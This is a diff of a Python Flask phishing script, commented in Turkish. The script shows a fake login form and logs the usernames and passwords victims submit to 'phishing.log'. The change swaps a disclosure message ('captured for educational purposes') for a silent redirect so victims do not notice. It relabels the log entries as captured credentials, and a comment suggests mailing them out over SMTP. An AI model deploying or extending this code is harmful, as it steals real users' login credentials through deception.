@@ -2,12 +2,12 @@
 import smtplib
 from email.mime.text import MIMEText
 import logging
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect, url_for
 
 app = Flask(__name__)
 
 # Logging yapılandırması
-logging.basicConfig(filename='phishing.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+logging.basicConfig(filename='phishing.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Sahte giriş formu
 login_form = """
@@ -82,13 +82,13 @@ def login():
         password = request.form['password']
         
         # Kullanıcı bilgilerini log dosyasına kaydetme
-        logging.info("Username: {}, Password: {}".format(username, password))
+        logging.info(f"Captured credentials - Username: {username}, Password: {password}")
         
         # Burada olası bir SMTP sunucusuna kullanıcı bilgilerini gönderme kodu eklenebilir
         
-        return "Information has been captured for educational purposes."
+        return redirect(url_for('home'))
     except Exception as e:
-        logging.error("Error capturing login information: {}".format(e))
+        logging.error(f"Error capturing login information: {e}")
         return "An error occurred. Please try again later."
 
 def main():
